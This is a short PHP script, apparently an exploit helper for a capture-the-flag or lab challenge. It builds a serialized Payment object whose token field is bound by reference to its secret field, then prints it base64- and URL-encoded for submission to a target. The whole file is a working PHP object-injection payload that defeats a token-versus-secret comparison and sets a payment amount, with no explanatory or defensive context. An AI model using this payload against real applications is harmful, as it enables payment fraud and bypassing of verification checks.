<?php

    class Payment{
        public $totalPayment;
        public $token;
        public $secret;
    }

    $data = new Payment;
    $data->totalPayment = 2;
    $data->token = &$data->secret;

    print(urlencode(base64_encode(serialize($data))));


?>